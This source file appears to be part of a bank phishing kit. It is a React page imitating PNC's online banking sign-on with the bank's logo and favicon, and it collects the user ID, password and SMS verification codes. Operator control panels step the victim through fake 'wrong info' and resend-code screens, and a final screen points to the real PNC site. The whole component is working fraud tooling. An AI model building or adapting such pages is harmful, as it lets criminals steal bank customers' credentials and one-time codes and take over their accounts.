import { otpOptions } from "../../bankDetails";
import BankingHeader from "./BankingHeader";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import clsx from "clsx";
import { motion } from "framer-motion";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import PncFavIcon from "../../../../../../../../assets/allBanks/banks/pnc/pc3.ico";
import PncImage from "../../../../../../../../assets/allBanks/banks/pnc/pc2.svg";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Pnc = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-customGray-1052",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="Sign On | PNC"
          handleCancel={handleCancel}
          img={PncFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />
        <header className="w-full py-3 bg-customGray-1051">
          <div>
            <img
              src={PncImage}
              alt=""
              className="w-[110px] h-[25px] object-contain"
            />
          </div>
        </header>

        <div className="flex items-center justify-center px-6 pt-8 text-customGray-900">
          <div className={clsx("w-full ", allBankOpen ? "hidden" : "block")}>
            <div className="space-y-2 text-xl text-center text-white customMiniTablet:text-2xl mb-7">
              <h3>
                You have come from an app that is trying to access your
                information
              </h3>
              <p>Sign On To PNC Online Banking</p>
            </div>
            <div className="p-[2rem] customMiniTablet:p-[4rem]  customMiniTablet:mx-20 bg-white">
              <p className="mb-8 text-[10px] italic text-customGray-400">
                Fields marked with asterisks(*) are required.
              </p>
              <div className={clsx()}>
                <div className="mb-9">
                  <input
                    type="text"
                    value={formState.username}
                    name="username"
                    onChange={handleChange}
                    placeholder="User ID*"
                    className={clsx(
                      "w-full pb-1 border-b outline-none border-b-customGray-400 focus:border-b-customBlue-1023 transistion2 placeholder:text-sm placeholder:text-customGray-400",
                      errorFormState.username
                        ? "border-b border-b-customRed-200"
                        : ""
                    )}
                  />
                  {errorFormState.username && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-200">
                      Enter User ID
                    </p>
                  )}
                </div>
                <div className="relative mb-16">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={formState.password}
                    name="password"
                    onChange={handleChange}
                    placeholder="Password*"
                    className={clsx(
                      "w-full pb-1 border-b outline-none border-b-customGray-400 focus:border-b-customBlue-1023 transistion2 placeholder:text-sm placeholder:text-customGray-400",
                      errorFormState.password
                        ? "border-b border-b-customRed-200"
                        : ""
                    )}
                  />
                  <span
                    onClick={() => setshowPassword((prevShow) => !prevShow)}
                    className="absolute right-0 h-full py-2 text-customBlue-1023"
                  >
                    {showPassword ? (
                      <FaRegEyeSlash size={18} />
                    ) : (
                      <FaRegEye size={18} />
                    )}
                  </span>
                  {errorFormState.password && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-200">
                      Enter Password
                    </p>
                  )}
                </div>
                <div className="flex justify-center w-full my-7">
                  <button
                    onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                    className="w-[35%] py-3 text-white font-medium shadow-md bg-customBlue-500"
                  >
                    {loading && <ClipLoader size={10} color="#fff" />}
                    {loading ? "Loading..." : "Sign On"}
                  </button>
                </div>
                <div className="text-sm text-center ">
                  <Link to="" className="font-medium text-customBlue-1023">
                    Forgot User ID or Password?
                  </Link>
                  <div className="my-3 text-customGray-900">
                    New to PNC Online and Mobile Banking?{" "}
                    <Link to="" className="font-medium text-customBlue-1023">
                      Enroll now.
                    </Link>
                  </div>
                  <Link className="font-medium text-customBlue-1023">
                    Message PNC For Login Help
                  </Link>
                </div>
              </div>
            </div>
          </div>
          <div>
            {allBankOpen && (
              <div className={clsx(OtpOpen ? "hidden" : "block")}>
                <BankControl
                  handleSelectedId={handleSelectedId}
                  selectedPath={selectedPath}
                  handleSelectSubmit={handleSelectSubmit}
                />
                <div>
                  {activePathDetails.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activePathDetails.name === "Wrong Info" && (
                    <>
                      <div className={clsx("w-full ")}>
                        <div className="space-y-2 text-xl text-center text-white customMiniTablet:text-2xl mb-7">
                          <h3>
                            You have come from an app that is trying to access
                            your information
                          </h3>
                          <p>Sign On To PNC Online Banking</p>
                        </div>
                        <div className="p-[2rem] customMiniTablet:p-[4rem]  customMiniTablet:mx-20 bg-white">
                          <p className="mb-8 text-[10px] italic text-customGray-400">
                            Fields marked with asterisks(*) are required.
                          </p>
                          <div className={clsx()}>
                            <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                              <p>{activePathDetails.body}</p>
                            </div>
                            <div className="mb-9">
                              <input
                                type="text"
                                value={formState.username}
                                name="username"
                                onChange={handleChange}
                                placeholder="User ID*"
                                className={clsx(
                                  "w-full pb-1 border-b outline-none border-b-customGray-400 focus:border-b-customBlue-1023 transistion2 placeholder:text-sm placeholder:text-customGray-400",
                                  errorFormState.username
                                    ? "border-b border-b-customRed-200"
                                    : ""
                                )}
                              />
                              {errorFormState.username && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-200">
                                  Enter User ID
                                </p>
                              )}
                            </div>
                            <div className="relative mb-16">
                              <input
                                type={showPassword ? "text" : "password"}
                                value={formState.password}
                                name="password"
                                onChange={handleChange}
                                placeholder="Password*"
                                className={clsx(
                                  "w-full pb-1 border-b outline-none border-b-customGray-400 focus:border-b-customBlue-1023 transistion2 placeholder:text-sm placeholder:text-customGray-400",
                                  errorFormState.password
                                    ? "border-b border-b-customRed-200"
                                    : ""
                                )}
                              />
                              <span
                                onClick={() =>
                                  setshowPassword((prevShow) => !prevShow)
                                }
                                className="absolute right-0 h-full py-2 text-customBlue-1023"
                              >
                                {showPassword ? (
                                  <FaRegEyeSlash size={18} />
                                ) : (
                                  <FaRegEye size={18} />
                                )}
                              </span>
                              {errorFormState.password && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-200">
                                  Enter Password
                                </p>
                              )}
                            </div>
                            <div className="flex justify-center w-full my-7">
                              <button
                                onClick={(e) =>
                                  handleTheMainSubmit(e, onSumbitForm)
                                }
                                className="w-[35%] py-3 text-white font-medium shadow-md bg-customBlue-500"
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Sign On"}
                              </button>
                            </div>
                            <div className="text-sm text-center ">
                              <Link
                                to=""
                                className="font-medium text-customBlue-1023"
                              >
                                Forgot User ID or Password?
                              </Link>
                              <div className="my-3 text-customGray-900">
                                New to PNC Online and Mobile Banking?{" "}
                                <Link
                                  to=""
                                  className="font-medium text-customBlue-1023"
                                >
                                  Enroll now.
                                </Link>
                              </div>
                              <Link className="font-medium text-customBlue-1023">
                                Message PNC For Login Help
                              </Link>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePathDetails.name === "Send Otp" && (
                    <>
                      <h3>{activePathDetails.body}</h3>
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-white py-4",
                          isOpenOtp && "hidden"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Verify your identity
                              </h3>
                              <p className="mb-2 text-center ">
                                For your security, we need to verify it&apos;s
                                really you.
                              </p>
                            </div>
                            <div>
                              <h2 className="mb-2 text-sm font-bold">
                                How would you like to get your verification
                                code?
                              </h2>
                              <p className="mb-2 text-sm text-customGray-100">
                                Select One:
                              </p>
                              <div
                                role="radiogroup"
                                aria-label="Otp Options"
                                className="flex flex-col space-y-3"
                              >
                                {otpOptions.map((bank) => (
                                  <div
                                    key={bank.id}
                                    role="radio"
                                    tabIndex={0}
                                    onClick={() => handleOtpOption(bank.id)}
                                    className="flex items-center gap-2.5 "
                                  >
                                    <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                      <p
                                        className={clsx(
                                          "rounded-full w-[10px] h-[10px]  ",
                                          otpOptions[indexOtp]?.id === bank.id
                                            ? "bg-customBlue-500"
                                            : ""
                                        )}
                                      ></p>
                                    </div>
                                    <h2
                                      className={clsx(
                                        "text-sm",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "text-customBlue-500 hover:underline"
                                          : "hover:text-customBlue-700 hover:underline"
                                      )}
                                    >
                                      {bank.name}
                                    </h2>
                                  </div>
                                ))}
                              </div>
                              <button
                                onClick={onSubmitOtpOptions}
                                className="w-full py-3 my-5 font-medium text-white shadow-md bg-customBlue-500"
                              >
                                Continue
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      {isOpenOtp && (
                        <div
                          className={clsx(
                            " customMiniTablet:w-[500px] px-4 bg-white py-4"
                          )}
                        >
                          <div>
                            <div>
                              <div>
                                <h3 className="mb-2 text-xl font-bold text-center text-black">
                                  Enter Verification Code
                                </h3>
                              </div>
                              <div>
                                <h2 className="mb-2 text-center ">
                                  Enter the verification code we sent to your
                                  mobile number
                                </h2>
                                <div className="px-2 customMiniTablet:px-24">
                                  <div>
                                    <input
                                      type="number"
                                      placeholder="Enter Verification Code"
                                      value={formOtp.otpo}
                                      name="otpo"
                                      onChange={changeOtp}
                                      className={clsx(
                                        "w-full pb-1 border-b outline-none border-b-customGray-400 focus:border-b-customBlue-1023 transistion2 placeholder:text-sm placeholder:text-customGray-400 no-spinner",
                                        errorOtp.otpo
                                          ? "border-b border-b-customRed-200"
                                          : ""
                                      )}
                                    />
                                    {errorOtp.otpo && (
                                      <p className="mt-2 text-sm text-customRed-900">
                                        Please enter the verification code.
                                      </p>
                                    )}
                                  </div>
                                  <button
                                    className="w-full py-3 my-5 font-medium text-white shadow-md bg-customBlue-500"
                                    onClick={(e) =>
                                      onSubmitOtp(e, handleVerifiedOtp)
                                    }
                                  >
                                    {loading && (
                                      <ClipLoader size={10} color="#fff" />
                                    )}
                                    {loading ? "Loading..." : "Verify"}
                                  </button>
                                </div>
                                <p
                                  className={clsx(
                                    "cursor-pointer text-customBlue-100 font-bold text-center",
                                    !resend &&
                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                  )}
                                  onClick={handleResend}
                                >
                                  Didnt get a code? Resend
                                </p>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </>
                  )}
                </div>
              </div>
            )}
            {OtpOpen && (
              <>
                <BankOtpControl
                  handleSelectedOtp={handleSelectedOtp}
                  selectedOtp={selectedOtp}
                  handleSubmitOtp={handleSubmitOtp}
                />

                <div>
                  {activeOtp.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activeOtp.name === "wrong" && (
                    <>
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-white py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full pb-1 border-b outline-none border-b-customGray-400 focus:border-b-customBlue-1023 transistion2 placeholder:text-sm placeholder:text-customGray-400 no-spinner",
                                      errorOtp.otpo
                                        ? "border-b border-b-customRed-200"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-900">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                  <h3 className="mt-2 text-sm text-customRed-200">
                                    {activeOtp.body}
                                  </h3>
                                </div>
                                <button
                                  className="w-full py-3 my-5 font-medium text-white shadow-md bg-customBlue-500"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activeOtp.name === "otp" && (
                    <>
                      <ShareData
                        bankName={bankName}
                        handleTheFinal={handleTheFinal}
                        handleCancel={handleCancel}
                        setIsOpenOtp={setIsOpenOtp}
                        setAllBankItems={setAllBankItems}
                        siteLink="https://www.pnc.com/en/personal-banking.html"
                      />
                    </>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
      </motion.div>
    </>
  );
};

export default Pnc;
